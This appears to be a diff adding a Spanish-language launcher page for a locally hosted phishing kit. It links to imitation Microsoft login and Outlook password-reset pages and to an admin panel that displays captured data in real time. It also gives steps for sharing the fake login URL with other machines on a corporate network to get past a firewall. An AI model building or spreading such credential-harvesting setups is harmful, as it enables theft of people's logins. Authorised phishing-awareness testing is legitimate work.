@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Inicio Rápido - Servidor Local</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 800px;
+            padding: 40px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 32px;
+        }
+        .status {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .status.error {
+            background: #f8d7da;
+            border-left-color: #dc3545;
+        }
+        .links {
+            display: grid;
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .link-card {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 8px;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+        .link-card:hover {
+            border-color: #667eea;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.2);
+        }
+        .link-card h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        .link-card a {
+            color: #0066cc;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .link-card a:hover {
+            text-decoration: underline;
+        }
+        .code {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        .steps {
+            list-style-position: inside;
+            line-height: 1.8;
+        }
+        .steps li {
+            margin-bottom: 10px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            background: #667eea;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 600;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Servidor Local Iniciado</h1>
+        
+        <div class="status" id="status">
+            ✅ El servidor está funcionando correctamente en tu máquina
+        </div>
+
+        <p style="margin-bottom: 20px;">
+            Debido a que el proxy/firewall de tu empresa bloquea GitHub Pages, 
+            este servidor ejecuta todo localmente para que funcione dentro de tu red.
+        </p>
+
+        <div class="links">
+            <div class="link-card">
+                <h3>🔐 Página de Login</h3>
+                <p style="margin-bottom: 10px; color: #666;">Simulación de inicio de sesión de Microsoft</p>
+                <a href="/index.html" target="_blank">→ Abrir Login Page</a>
+            </div>
+
+            <div class="link-card">
+                <h3>🔄 Restablecimiento de Contraseña</h3>
+                <p style="margin-bottom: 10px; color: #666;">Simulación de reset de contraseña de Outlook</p>
+                <a href="/reset-password.html" target="_blank">→ Abrir Reset Password</a>
+            </div>
+
+            <div class="link-card">
+                <h3>📊 Panel de Administración</h3>
+                <p style="margin-bottom: 10px; color: #666;">Visualiza todas las capturas en tiempo real</p>
+                <a href="/admin.html" target="_blank">→ Abrir Panel Admin</a>
+            </div>
+        </div>
+
+        <h3 style="margin-top: 30px; margin-bottom: 15px;">📋 Próximos Pasos:</h3>
+        
+        <ol class="steps">
+            <li>✅ <strong>Servidor iniciado</strong> - Ya está corriendo</li>
+            <li>🧪 <strong>Probar el sistema</strong> - Abre el Login Page y prueba con datos ficticios</li>
+            <li>👀 <strong>Ver capturas</strong> - Revisa el Panel Admin para ver los datos capturados</li>
+            <li>🌐 <strong>Compartir en tu red</strong> - Otras computadoras pueden acceder usando tu IP local</li>
+        </ol>
+
+        <div class="code">
+# Para compartir con otros en tu red:<br>
+# Encuentra tu IP con:<br>
+<span style="color: #50fa7b;">ipconfig</span> <span style="color: #6272a4;">(Windows)</span><br>
+<span style="color: #50fa7b;">ifconfig</span> <span style="color: #6272a4;">(Mac/Linux)</span><br>
+<br>
+# Luego comparte esta URL:<br>
+http://TU_IP:8080/index.html
+        </div>
+
+        <h3 style="margin-top: 30px; margin-bottom: 15px;">🔍 Información Técnica:</h3>
+        
+        <div style="background: #f8f9fa; padding: 15px; border-radius: 6px;">
+            <p><strong>Puerto:</strong> <span id="port">8080</span></p>
+            <p><strong>Capturas guardadas:</strong> <span id="captureCount">0</span></p>
+            <p><strong>Estado API:</strong> <span id="apiStatus">Verificando...</span></p>
+        </div>
+
+        <div style="margin-top: 30px; text-align: center;">
+            <a href="/admin.html" class="btn">📊 Ir al Panel de Admin</a>
+        </div>
+    </div>
+
+    <script>
+        // Verificar estado del servidor
+        async function checkStatus() {
+            try {
+                const res = await fetch('/api/health');
+                const data = await res.json();
+                document.getElementById('apiStatus').textContent = '✅ Activo';
+                document.getElementById('captureCount').textContent = data.captures || 0;
+            } catch(e) {
+                document.getElementById('apiStatus').textContent = '❌ Error';
+            }
+        }
+
+        // Obtener puerto del servidor
+        const port = window.location.port || '8080';
+        document.getElementById('port').textContent = port;
+
+        checkStatus();
+        setInterval(checkStatus, 5000);
+    </script>
+</body>
+</html>
